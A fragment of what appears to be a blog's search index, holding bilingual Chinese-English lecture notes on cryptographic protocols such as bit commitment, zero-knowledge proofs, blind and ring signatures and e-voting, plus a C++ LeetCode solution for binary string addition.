<h3 id="bit-commitment-位承诺"><a href="#bit-commitment-位承诺" class="headerlink" title="bit commitment(位承诺)"></a>bit commitment(位承诺)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单的例子:</span><br><span class="line">决定游戏中谁获胜</span><br><span class="line">如果Bob猜的正确，则他获胜</span><br><span class="line">Alice选择一位(0&#x2F;1),并且把它锁在一个盒子里</span><br><span class="line">Bob猜测一下</span><br><span class="line">打开盒子验证是否正确</span><br><span class="line">两个部分:</span><br><span class="line">承诺、揭幕</span><br><span class="line">必须确保:</span><br><span class="line">Bob猜测后，Alice无法改变她的数据</span><br><span class="line">在Alice选中一位时，Bob不知道她的数据.</span><br><span class="line"></span><br><span class="line">Simplest example:</span><br><span class="line">	Decide who goes first in a game</span><br><span class="line">	If Bob guesses correctly, he goes</span><br><span class="line">	Alice picks a bit (0 or 1) and locks it in a box</span><br><span class="line">	Bob guesses a bit</span><br><span class="line">	The box is opened to see if he is right</span><br><span class="line">Two parts:</span><br><span class="line">	Commitment</span><br><span class="line">	Unveiling</span><br><span class="line">Must ensure that:</span><br><span class="line">	Alice cannot change her bit after Bob guesses</span><br><span class="line">	Bob cannot know what Alice’s bit is until she unveils it</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Fair-Coin-Flips-公平的硬币抛掷"><a href="#Fair-Coin-Flips-公平的硬币抛掷" class="headerlink" title="Fair Coin Flips(公平的硬币抛掷)"></a>Fair Coin Flips(公平的硬币抛掷)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">基本方法：</span><br><span class="line">Alice选择随机位b并通过位承诺方案提交给它（给Bob）</span><br><span class="line">鲍勃试图猜测这个位并将他的猜测发送给爱丽丝</span><br><span class="line">爱丽丝向鲍勃透露了比特b</span><br><span class="line">他们都知道Bob是否猜对了</span><br><span class="line"></span><br><span class="line">Basic approach:</span><br><span class="line">	Alice selects a random bit b and commits to it (to Bob) via a bit commitment scheme</span><br><span class="line">	Bob tries to guess the bit and sends his guess to Alice</span><br><span class="line">	Alice reveals the bit b to Bob</span><br><span class="line">	They both know if Bob guessed correctly</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="mental-poker-智力扑克"><a href="#mental-poker-智力扑克" class="headerlink" title="mental poker(智力扑克)"></a>mental poker(智力扑克)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice和Bob使用可交换的公钥密码系统</span><br><span class="line"></span><br><span class="line">DA（EB（EA（m）））&#x3D; EB（m）</span><br><span class="line"></span><br><span class="line">Alice使用她的公钥加密52条消息m1 &#x3D;（“黑桃王牌”，r1）......</span><br><span class="line">Alice将blob发送给Bob。</span><br><span class="line">Bob为Alice选择5张牌并将其发送给她。</span><br><span class="line">Bob为自己选择5，用他的公钥加密并将它们发送给Alice。</span><br><span class="line">Alice用她的公钥解密消息并发回Bob。</span><br><span class="line">Bob解密消息以确定他的手。</span><br><span class="line">在比赛结束时，Alice和Bob展示了他们的密钥对，以确保不会作弊。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Alice and Bob use a commutative public key cryptosystem</span><br><span class="line"></span><br><span class="line">DA(EB(EA(m))) &#x3D; EB(m)</span><br><span class="line"></span><br><span class="line">Alice encrypts 52 messages m1 &#x3D; (“Ace of Spades”, r1) … using her public key.</span><br><span class="line">Alice sends the blobs to Bob. </span><br><span class="line">Bob chooses 5 cards for Alice and sends them to her.</span><br><span class="line">Bob picks 5 for himself, encrypts with his public key and sends them back to Alice. </span><br><span class="line">Alice decrypts the messages with her public key and sends back to Bob.</span><br><span class="line">Bob decrypts the messages to determine his hand.</span><br><span class="line">At the end of the game, Alice and Bob reveal their key pairs to ensure neither cheats.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Key-Escrow-密钥托管"><a href="#Key-Escrow-密钥托管" class="headerlink" title="Key Escrow(密钥托管)"></a>Key Escrow(密钥托管)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Micali的公平密码系统</span><br><span class="line">将私钥分成n个部分，并将每个部分分发给不同的可信部门</span><br><span class="line">可以在不重建私钥的情况下验证每个部分的正确性</span><br><span class="line">如果需要，法院命令可以授权执法机关从受托人那里收集n件并构建私钥</span><br><span class="line"></span><br><span class="line">Micali’s Fair Cryptosystem</span><br><span class="line">	Break up the private key into n pieces and distribute each piece to different trusted authorities</span><br><span class="line">	Each piece can be verified for correctness without reconstructing the private key</span><br><span class="line">	If needed, court order can authorize law enforcement authorities to gather n pieces from trustees and construct the private key </span><br><span class="line"></span><br><span class="line">Alice创建了她的私钥&#x2F;公钥对。她将私钥分成几个公共部分和私人部分</span><br><span class="line">Alice向每个受托人发送公共部分和相应的私人作品。这些消息必须加密。她还将公钥发送给KDC</span><br><span class="line">每个受托人独立地对其公共部分及其私人部分进行计算，以确保其正确性。每个受托人将私人作品存放在安全的地方，并将公共部分发送给KDC</span><br><span class="line">KDC对公共部分和公钥执行另一次计算以确保正确性。然后它签署公钥并将其发送回Alice或在某个地方的数据库中发布。</span><br><span class="line"></span><br><span class="line">Key Escrow Protocol</span><br><span class="line">	Alice creates her private&#x2F;public key pair. She splits the private key into several public pieces and private pieces</span><br><span class="line">	Alice sends a public piece and corresponding private piece to each of the trustees. These messages must be encrypted. She also sends the public key to the KDC</span><br><span class="line">	Each trustee, independently, performs a calculation on its public piece and its private piece for correctness. Each trustee  stores the private piece somewhere secure and sends the public piece to the KDC</span><br><span class="line">	KDC performs another calculation on the public pieces and the public key for correctness. It then signs the public key and either sends it back to Alice or posts it in a database somewhere.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="oblivious-transfer-不经意传输"><a href="#oblivious-transfer-不经意传输" class="headerlink" title="oblivious transfer(不经意传输)"></a>oblivious transfer(不经意传输)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明显的转移是Alice可以以这样的方式向Bob发送秘密的方式，即Bob以概率0.5接收秘密并且Alice不知道它是否被接收。 （即“我有一个秘密，你得到的概率为0.5”）。</span><br><span class="line"></span><br><span class="line">这可以扩展到“我有两个秘密，你得到一个”“我有n个秘密，你得到一个”，等等。</span><br><span class="line"></span><br><span class="line">明显的转移并不是单独使用的。 它在其他协议中用作构建块。</span><br><span class="line"></span><br><span class="line">Obvious transfer is a way Alice can send a secret to Bob in such a way that Bob receives the secret with probability 0.5 and Alice does not know if it is received or not. (i.e. “I have one secret and you get it with probability 0.5”).</span><br><span class="line"></span><br><span class="line">This can be extended to “I have two secrets and you get one” “I have n secrets and you get one”, etc.</span><br><span class="line"></span><br><span class="line">Obvious transfer is not used alone. It is used as a building block in other protocols.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Authentication-protocols-认证协议"><a href="#Authentication-protocols-认证协议" class="headerlink" title="Authentication protocols(认证协议)"></a>Authentication protocols(认证协议)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice必须向Bob证明自己的身份，同时也可以要求Bob证明自己的身份(相互认证).</span><br><span class="line">可能需要建立会话密钥，也有其他要求，如使用公钥、使用对称密钥、使用哈希函数.</span><br><span class="line"></span><br><span class="line">Alice must prove her identity to Bob</span><br><span class="line">	Alice and Bob can be humans or computers</span><br><span class="line">May also require Bob to prove he’s Bob (mutual authentication)</span><br><span class="line">May also need to establish a session key</span><br><span class="line">May have other requirements, such as</span><br><span class="line">	Use only public keys</span><br><span class="line">	Use only symmetric keys</span><br><span class="line">	Use only a hash function</span><br><span class="line">	Anonymity, plausible deniability, etc., etc.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Method-of-Session-Key-Generation-会话密钥生成方法"><a href="#Method-of-Session-Key-Generation-会话密钥生成方法" class="headerlink" title="Method of Session Key Generation(会话密钥生成方法)"></a>Method of Session Key Generation(会话密钥生成方法)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密钥传输协议：一个用户创建或获取秘密值并将其安全地传输给其他用户</span><br><span class="line">密钥协商协议：会话密钥是所有协议用户输入的函数。</span><br><span class="line">混合协议：会话密钥是多个主体的输入函数，但不是所有用户的输入函数。</span><br><span class="line"></span><br><span class="line">Key Transport Protocol: one user creates or obtains a secret value and securely transfers it to the other users</span><br><span class="line">Key Agreement Protocol: the session key is a function of inputs by all protocol users.</span><br><span class="line">Hybrid Protocol: the session key is a function of inputs by more than one principal, but not by all users.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Additional-Security-Attributes-其他安全属性"><a href="#Additional-Security-Attributes-其他安全属性" class="headerlink" title="Additional Security Attributes(其他安全属性)"></a>Additional Security Attributes(其他安全属性)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">已知（会话）密钥安全性：协议运行应该产生唯一的秘密会话密钥。 如果此密钥被泄露，它应该对其他会话密钥没有影响。</span><br><span class="line">前向安全：即使长期私钥被泄露，也不会对先前建立的会话密钥的保密性产生任何影响。</span><br><span class="line"></span><br><span class="line">Known (Session) Key Security:A protocol run should result in a unique secret session key. If this key is compromised, it should have no impact on other session keys.</span><br><span class="line">Forward Secrecy: Even if long-term private keys are compromised, it should not have any effect on the secrecy of previously established session keys. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Zero-knowledge-proof-零知识证明"><a href="#Zero-knowledge-proof-零知识证明" class="headerlink" title="Zero-knowledge proof(零知识证明)"></a>Zero-knowledge proof(零知识证明)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Peggy想要向Victor证明她有一些有价值的信息，但她根本不想向Victor透露它</span><br><span class="line">零知识证明是“证明者”可以向“验证者”证明拥有某条信息而不泄露它的一种方式。</span><br><span class="line">加密协议研究的核心工具</span><br><span class="line"></span><br><span class="line">Peggy wants to prove to Victor that she has a piece of valuable information but she does not want to reveal it to Victor at all</span><br><span class="line">A zero-knowledge proof is a way that a “prover” can prove possession of a certain piece of information to a “verifier” without revealing it.</span><br><span class="line">Central tool in study of cryptographic protocols</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Graph-Isomorphism-图同构"><a href="#Graph-Isomorphism-图同构" class="headerlink" title="Graph Isomorphism(图同构)"></a>Graph Isomorphism(图同构)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假设Peggy知道，图G1和G2是同构的，并且想要说服Victor知道她的知识</span><br><span class="line">协议:</span><br><span class="line">1.Peggy随机置换G1以产生图H，与G1同构。 找到G1和H之间或H和G2之间的同构与寻找G1和G2之间的同构一样困难</span><br><span class="line">2.Peggy把H送给了Victor</span><br><span class="line">3.Victor要求Peggy要么：</span><br><span class="line">	证明H和G1是同构的，或者</span><br><span class="line">	H和G2是同构的</span><br><span class="line">4.Peggy遵守。 她要么：</span><br><span class="line">	证明H和G1是同构的，没有证明H和G2是同构的，或者</span><br><span class="line">	证明H和G2是同构的，没有证明H和G1是同构的</span><br><span class="line">5.Peggy和Victor重复步骤（1）到（4）n次</span><br><span class="line">注意，在每一轮中，Victor接收一个新的H随机排列，以及H与G1或G2之间的同构</span><br><span class="line"></span><br><span class="line">Assume that Peggy knows, graphs G1 and G2 are isomorphic and wants to convince Victor of her knowledge</span><br><span class="line">Protocol</span><br><span class="line">	1.Peggy randomly permutes G1 to produce a graph H, isomorphic to G1. Finding an isomorphism between G1 and H or between H and G2 is just as hard as finding an isomorphism between G1 and G2</span><br><span class="line">	2.Peggy sends H to Victor</span><br><span class="line">	3.Victor asks Peggy either to:</span><br><span class="line">		Prove that H and G1 are isomorphic, or</span><br><span class="line">		that H and G2 are isomorphic</span><br><span class="line">	4.Peggy complies. She either:</span><br><span class="line">		Proves that H and G1 are isomorphic, without proving that H and G2 are isomorphic, or</span><br><span class="line">		Proves that H and G2 are isomorphic, without proving that H and G1 are isomorphic</span><br><span class="line">	5.Peggy and Victor repeat steps (1) through (4) n times</span><br><span class="line">Notice, in each round, Victor receives a new random permutation of H, along with an isomorphism between H and either G1 or G2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Hamilton回路"><a href="#Hamilton回路" class="headerlink" title="Hamilton回路"></a>Hamilton回路</h3><p>在图论中，图G中的回路是指始点和终点相重合的路径，若回路通过图的每个顶点一次且仅一次，则称图G为哈密尔顿回路，构造图G的哈密尔顿回路是NPC问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">假定P知道图G的哈密尔顿回路，并希望向V证明这一事实，则：</span><br><span class="line">（1）P随机地构造一个与图G同构的图W,并将W交给V</span><br><span class="line">（2）V随机的要求P做下述两件工作之一：</span><br><span class="line">1.证明图G和图W同构</span><br><span class="line">2.指出图W的一条哈密尔顿回路</span><br><span class="line">（3）P根据要求做下述两件工作之一：</span><br><span class="line">1.证明图G和图W同构，但不能指出图G或者图W的哈密尔顿回路</span><br><span class="line">2.指出图W的哈密尔顿回路，但不证明图G和图W同构</span><br><span class="line">（4）P和V重复以上过程n次</span><br></pre></td></tr></table></figure>
<h2 id="Digital-Signature-variant-数字签名变种"><a href="#Digital-Signature-variant-数字签名变种" class="headerlink" title="Digital Signature variant(数字签名变种)"></a>Digital Signature variant(数字签名变种)</h2><h3 id="Blind-Signatures-盲签名"><a href="#Blind-Signatures-盲签名" class="headerlink" title="Blind Signatures(盲签名)"></a>Blind Signatures(盲签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概念</span><br><span class="line">所谓盲签名就是指签名人只是完成对文件的签名工作，并不了解所签文件的内容</span><br><span class="line">而平常的签名内容，都是签名者对所签内容是知道的</span><br><span class="line"></span><br><span class="line">特点</span><br><span class="line">（1）签名者不知道所签署的数据内容</span><br><span class="line">（2）在签名被签名申请者泄露后，签名者不能追踪签名</span><br><span class="line"></span><br><span class="line">步骤</span><br><span class="line">（1）申请者对待签名文件进行盲化</span><br><span class="line">（2）签名者对文件签名</span><br><span class="line">（3）申请者将签名后文件去盲，即可得到原始数据的签名</span><br><span class="line"></span><br><span class="line">假设我们希望人们在没有看到内容的情况下签署文档</span><br><span class="line"></span><br><span class="line">Suppose we want people to sign documents without ever seeing their contents</span><br></pre></td></tr></table></figure>
<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p><img src="/uploads/aqxy.png" alt="1"></p>
<h3 id="Partially-Blind-Signatures-部分盲签名"><a href="#Partially-Blind-Signatures-部分盲签名" class="headerlink" title="Partially Blind Signatures(部分盲签名)"></a>Partially Blind Signatures(部分盲签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概念</span><br><span class="line">“部分”意味着待签名的消息是由签名申请方和签名方共同生成的</span><br><span class="line">即待签名消息包括签名申请者提交的待签名消息和签名者提供的”身份消息”</span><br><span class="line"></span><br><span class="line">改进</span><br><span class="line">允许签名者添加一些诸如签名时间、签名有效期和对签署消息性质的说明性信息等内容</span><br><span class="line">1.保证了待签消息对签名者的盲性</span><br><span class="line">2.阻止了签名申请者提供非法信息而滥用签名</span><br><span class="line">3.有效的保护了签名者的合法权益</span><br></pre></td></tr></table></figure>
<h3 id="Fair-Blind-Signatures-公平盲签名"><a href="#Fair-Blind-Signatures-公平盲签名" class="headerlink" title="Fair Blind Signatures(公平盲签名)"></a>Fair Blind Signatures(公平盲签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概念</span><br><span class="line">可以在需要的时候让一个可信任第三方发布信息，允许签名人把消息——签名对和签名时的具体内容联系起来，实现对签名申请人的追踪</span><br><span class="line"></span><br><span class="line">新特性</span><br><span class="line">引入可信中心，通过可信中心的授权，签名者可追踪签名</span><br><span class="line">在需要的时候让一个可信任第三方发布信息，允许签名人把消息——签名对和他签名时候的具体内容联系起来，揭开签名，实现对签名申请者的追踪</span><br></pre></td></tr></table></figure>
<h3 id="Digital-Signature-Scheme-Based-on-multiple-hard-problems-基于多重数学难题的数字签名方案"><a href="#Digital-Signature-Scheme-Based-on-multiple-hard-problems-基于多重数学难题的数字签名方案" class="headerlink" title="Digital Signature Scheme Based on multiple hard problems(基于多重数学难题的数字签名方案)"></a>Digital Signature Scheme Based on multiple hard problems(基于多重数学难题的数字签名方案)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么我们需要一个基于多个难题的密码系统？</span><br><span class="line"></span><br><span class="line">因子分解问题的假设很难。</span><br><span class="line">离散对数问题的假设很难。</span><br><span class="line">更强烈的假设是</span><br><span class="line">多个加密假设不太可能同时变得容易解决。</span><br><span class="line"></span><br><span class="line">Why we need a cryptosystem based on multiple hard problems?</span><br><span class="line"></span><br><span class="line">The assumption of factoring problem is it being hard.</span><br><span class="line">The assumption of discrete logarithm problem is it being hard.</span><br><span class="line">More strong assumption is that</span><br><span class="line">it is very unlikely that multiple cryptographic assumptions would simultaneously become easy to solve.</span><br></pre></td></tr></table></figure>
<h3 id="Proxy-Signature-代理签名"><a href="#Proxy-Signature-代理签名" class="headerlink" title="Proxy Signature(代理签名)"></a>Proxy Signature(代理签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原始签名者将他&#x2F;她的签名能力委托给代理签名者（向代理签名者发出代理密钥对）</span><br><span class="line">代理签名者使用代理密钥对代表原始签名者签名消息</span><br><span class="line">接收者一起验证签名本身和原始签名者的委托</span><br><span class="line"></span><br><span class="line">An original signer delegates his&#x2F;her signing capability to a proxy signer (issues a proxy key pair to proxy signer)</span><br><span class="line">Proxy signer signs a message on behalf of the original signer using the proxy key pair</span><br><span class="line">A receiver verifies the signature itself and original signer’s delegation together </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Group-Signatures-群签名"><a href="#Group-Signatures-群签名" class="headerlink" title="Group Signatures(群签名)"></a>Group Signatures(群签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在群签名方案中，群的成员可以代表群进行签名，签名可用单一的群公开密钥验证。一旦消息被签名，除了指定的群管理者，没有人能够确定该签名是哪个特定的群成员签署的。群签名应该保证没有其他成员能够对于给定的消息伪造另一个成员的签名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Ring-signatures-环签名"><a href="#Ring-signatures-环签名" class="headerlink" title="Ring signatures(环签名)"></a>Ring signatures(环签名)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">环签名方案是一种没有管理者的类群签名方案，环中任何一个成员都可以代表整个环进行签名，而验证者只知道签名来自这个环，但不知道谁才是真正的签名者。</span><br></pre></td></tr></table></figure>
<h2 id="Non-repudiation-protocol-非否认签名"><a href="#Non-repudiation-protocol-非否认签名" class="headerlink" title="Non-repudiation protocol(非否认签名)"></a>Non-repudiation protocol(非否认签名)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">非否认性。 提供个人保护，防止另一个人从未发生过通信的虚假声明</span><br><span class="line">甲方希望以可验证的方式将消息M转发给乙方</span><br><span class="line">A和B希望非否认令牌证明有关邮件传输的某些事实</span><br><span class="line"></span><br><span class="line">Non-repudiation. Offers a person protection against a false claim by another person that a communication never took place</span><br><span class="line">Party A wants to transfer a message M to party B in a verifiable way</span><br><span class="line">A and B want non-repudiation tokens to prove certain facts about the message transfer</span><br><span class="line"></span><br><span class="line">发送方非否认:防止消息的发送者拒绝发送消息</span><br><span class="line">接受方非否认:防止接收人拒绝收到邮件</span><br><span class="line"></span><br><span class="line">Non-repudiation of origin (NRO): to prevent the originator of a message from denying having sent the message</span><br><span class="line">Non-repudiation of receipt (NRR): to prevent the recipient of a message from denying having received the message</span><br><span class="line"></span><br><span class="line">EOO - B发送方非否认证据：证明A已发送消息M.</span><br><span class="line">EOR - A接收方非否认证据：证明B已收到消息M.</span><br><span class="line"></span><br><span class="line">EOO – Evidence of origin for B: Proves that A has sent message M.</span><br><span class="line">EOR – Evidence of receipt for A: Proves that B has received message M.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="TTP’s-involvement"><a href="#TTP’s-involvement" class="headerlink" title="TTP’s involvement"></a>TTP’s involvement</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内联TTP。 在协议期间涉及每个消息传输的TTP被称为内联。</span><br><span class="line">在线TTP。 在协议的每个会话期间涉及但在每个消息的传输期间不涉及的TTP被称为在线。</span><br><span class="line">离线TTP。 仅在虚假实体出现错误行为或在网络错误的情况下涉及协议的TTP，才能脱机。</span><br><span class="line"></span><br><span class="line">Inline TTP. A TTP involved in each message’s transmission during the protocol, is said to be inline. </span><br><span class="line">Online TTP. A TTP involved during each session of the protocol but not during each message’s transmission, is said to be online. </span><br><span class="line">Offline TTP. A TTP involved in a protocol only in case of an incorrect behavior of a dishonest entity or in case of a network error, issaid to be offline. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Zhou-Gollmann-protocol"><a href="#Zhou-Gollmann-protocol" class="headerlink" title="Zhou-Gollmann protocol"></a>Zhou-Gollmann protocol</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.A发送密文c&#x3D;Ek(m)、标签l、接受者名字B的签名。</span><br><span class="line">B使用这个信息作为A在协议标识l下发送了Ek(m)的证据</span><br><span class="line">2.B使用一个签名作为响应，表示在协议标识l下接收到了Ek(m)。</span><br><span class="line">A将使用这个信息作为B在协议标识l下接收到了Ek(m)的证据</span><br><span class="line">3.A接着把密钥K与协议标识l发送给可信服务器。</span><br><span class="line">如果A进行欺骗而发送一个错误的密钥K’，他就不能得到他需要的证据，因为Ek(m)与K’不能提供证据说明A发送了m。</span><br><span class="line">4和5中，A与B都可以从可信第三方获取密钥</span><br><span class="line"></span><br><span class="line">最后，A可以证明B对消息m的正确性负责，且B可以证明A对消息m的正确性负责</span><br></pre></td></tr></table></figure>
<h2 id="Fair-Exchange-Protocols-公平交换协议"><a href="#Fair-Exchange-Protocols-公平交换协议" class="headerlink" title="Fair Exchange Protocols(公平交换协议)"></a>Fair Exchange Protocols(公平交换协议)</h2><h3 id="Probabilistic-Contract-Signing-概率签合同"><a href="#Probabilistic-Contract-Signing-概率签合同" class="headerlink" title="Probabilistic Contract Signing(概率签合同)"></a>Probabilistic Contract Signing(概率签合同)</h3><p><img src="/uploads/aqxy2.png" alt="1"></p>
<h2 id="Secure-elections-安全选举"><a href="#Secure-elections-安全选举" class="headerlink" title="Secure elections(安全选举)"></a>Secure elections(安全选举)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">投票议定书的要求</span><br><span class="line"></span><br><span class="line">只有授权选民才能投票。</span><br><span class="line">没有人可以多次投票。</span><br><span class="line">没有人可以复制任何其他人的投票。</span><br><span class="line">没有人可以在不被发现的情况下改变别人的投票。</span><br><span class="line">每个选民都可以确保在最终制表中考虑到他的投票。</span><br><span class="line">没有人能确定其他人投票给谁。</span><br><span class="line">每个人都知道谁投票，谁没投票。</span><br><span class="line"></span><br><span class="line">Requirements for Voting Protocol</span><br><span class="line"></span><br><span class="line">Only authorized voters can vote.</span><br><span class="line">No one can vote more than once.</span><br><span class="line">No one can duplicate anyone else’s vote.</span><br><span class="line">No one can change anyone else’s vote without being discovered.</span><br><span class="line">Every voter can make sure that his vote has been taken into account in the final tabulation.</span><br><span class="line">No one can determine for whom anyone else voted.</span><br><span class="line">Everyone knows who voted and who didn’t.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Digital-Cash-数字现金"><a href="#Digital-Cash-数字现金" class="headerlink" title="Digital Cash(数字现金)"></a>Digital Cash(数字现金)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">支票和信用卡减少了实物现金流量，但有审计跟踪</span><br><span class="line">数字现金</span><br><span class="line">	匿名，无法追踪</span><br><span class="line">	一次性用于购买或转让或更改（不可复制）</span><br><span class="line">数字现金协议非常复杂</span><br><span class="line"></span><br><span class="line">Checks and credit cards have reduced the amount of physical cash flow but have an audit trail</span><br><span class="line">Digital cash</span><br><span class="line">	Anonymous, untraceable </span><br><span class="line">	One time use for purchase or transfer or change (cannot be copied)</span><br><span class="line">Digital cash protocols are very complex</span><br><span class="line"></span><br><span class="line">关键属性:安全、匿名、手提、可重复使用、用户友好</span><br><span class="line">Key Properties：Secure、 Anonymous、Portable、Reusable 、User-friendly </span><br><span class="line"></span><br><span class="line">安全需求：1.不可伪造性 2.私密性 3.不可否认性</span><br><span class="line"></span><br><span class="line">追踪</span><br><span class="line">1.现金追踪：如果一个可疑者支取现金，该现金可被撤销匿名并在存款时识别出</span><br><span class="line">2.属主追踪：如果一个可疑者存款，该现金可被撤销匿名并揭示出属主</span><br></pre></td></tr></table></figure>
<h2 id="Secure-Multiparty-Computation-安全多方计算"><a href="#Secure-Multiparty-Computation-安全多方计算" class="headerlink" title="Secure Multiparty Computation(安全多方计算)"></a>Secure Multiparty Computation(安全多方计算)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全多方协议：在这个协议中，一群人可以在一起用一种特殊的方法计算含有许多变量的任何函数。这一群中的每一个人都知道这个函数的值，淡出了函数输出的明显东西外，没有人知道关于任何其他成员输入的任何消息。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>安全协议</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode编程训练(array)</title>
    <url>/2021/01/29/LeetCode%E7%BC%96%E7%A8%8B%E8%AE%AD%E7%BB%83-array/</url>
    <content><![CDATA[<p>为了提高编程和算法水平，便加入了LeetCode的行列，学习练习提高水平。<br>本文是关于array专题的题解总结。</p>
<h2 id="67-二进制求和"><a href="#67-二进制求和" class="headerlink" title="67. 二进制求和"></a>67. 二进制求和</h2><p>给你两个二进制字符串，返回它们的和（用二进制表示）。<br>输入为 非空 字符串且只包含数字 1 和 0。<br>示例 1:<br>输入: a = “11”, b = “1”<br>输出: “100</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>1.保持输入的两个字符串长度一致，通过while判断，添加’0’<br>2.根据字符的ASCII码，’0’-‘0’=0，’0’+1=’1’<br>3.如果相加大于2，需要对2取余加’0’，并进位<br>4.最后对首位进行判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string addBinary(string a, string b) &#123;</span><br><span class="line">        while(a.length()&gt;b.length())&#123;</span><br><span class="line">            b&#x3D;&#39;0&#39;+b;</span><br><span class="line">        &#125;</span><br><span class="line">        while(a.length()&lt;b.length())&#123;</span><br><span class="line">            a&#x3D;&#39;0&#39;+a;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i&#x3D;a.length()-1;i&gt;0;i--)&#123;</span><br><span class="line">            a[i]&#x3D;a[i]-&#39;0&#39;+b[i];</span><br><span class="line">            if(a[i]-&#39;0&#39;&gt;&#x3D;2)&#123;</span><br><span class="line">                a[i]&#x3D;(a[i]-&#39;0&#39;)%2+&#39;0&#39;;</span><br><span class="line">                a[i-1]&#x3D;a[i-1]+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        a[0]&#x3D;a[0]-&#39;0&#39;+b[0];</span><br><span class="line">        if(a[0]-&#39;0&#39;&gt;&#x3D;2)&#123;</span><br><span class="line">            a[0]&#x3D;(a[0]-&#39;0&#39;)%2+&#39;0&#39;;</span><br><span class="line">            a&#x3D;&#39;1&#39;+a;</span><br><span class="line">        &#125;</span><br><span class="line">        return a;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
</search>
